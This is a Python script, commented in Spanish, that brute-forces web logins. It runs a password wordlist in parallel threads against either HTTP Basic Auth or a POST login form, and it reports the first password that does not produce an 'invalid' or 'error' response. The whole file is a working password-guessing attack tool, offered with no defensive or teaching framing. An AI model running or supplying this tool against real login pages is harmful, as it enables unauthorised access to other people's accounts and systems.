#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

class HTTPBrute:
    def __init__(self, url, username, wordlist, threads=4, mode='http-form'):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.mode = mode
        self.found = False
    
    def try_login_basic(self, password):
        """Intento de login HTTP Basic Auth"""
        try:
            response = requests.get(self.url, auth=(self.username, password), timeout=5)
            if response.status_code == 200:
                return True, password
            return False, None
        except:
            return False, None
    
    def try_login_form(self, password):
        """Intento de login con formulario POST"""
        try:
            # Adapta estos campos según el target
            data = {
                'username': self.username,
                'password': password,
                'login': 'submit'
            }
            response = requests.post(self.url, data=data, timeout=5)
            
            # Busca indicadores de login fallido (ajústalo)
            if 'invalid' not in response.text.lower() and 'error' not in response.text.lower():
                return True, password
            return False, None
        except:
            return False, None
    
    def start(self):
        """Inicia el ataque de fuerza bruta"""
        print(f"🎯 URL objetivo: {self.url}")
        print(f"👤 Usuario: {self.username}")
        print(f"🔧 Modo: {self.mode}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        # Cargar contraseñas
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        total = len(passwords)
        print(f"📊 Total contraseñas: {total:,}")
        print(f"🚀 Iniciando ataque con {self.threads} hilos...\n")
        
        with tqdm(total=total, desc="Probando contraseñas", unit="pass") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                
                for pwd in passwords:
                    if self.mode == 'http-basic':
                        future = executor.submit(self.try_login_basic, pwd)
                    else:
                        future = executor.submit(self.try_login_form, pwd)
                    futures[future] = pwd
                
                for future in as_completed(futures):
                    success, password = future.result()
                    if success:
                        print(f"\n✅ ¡ACCESO CONCEDIDO! 🎉")
                        print(f"🔓 Contraseña válida: {password}")
                        print(f"👤 Usuario: {self.username}")
                        self.found = True
                        executor.shutdown(wait=False)
                        break
                    pbar.update(1)
        
        if not self.found:
            print("\n❌ No se encontró la contraseña en el wordlist")
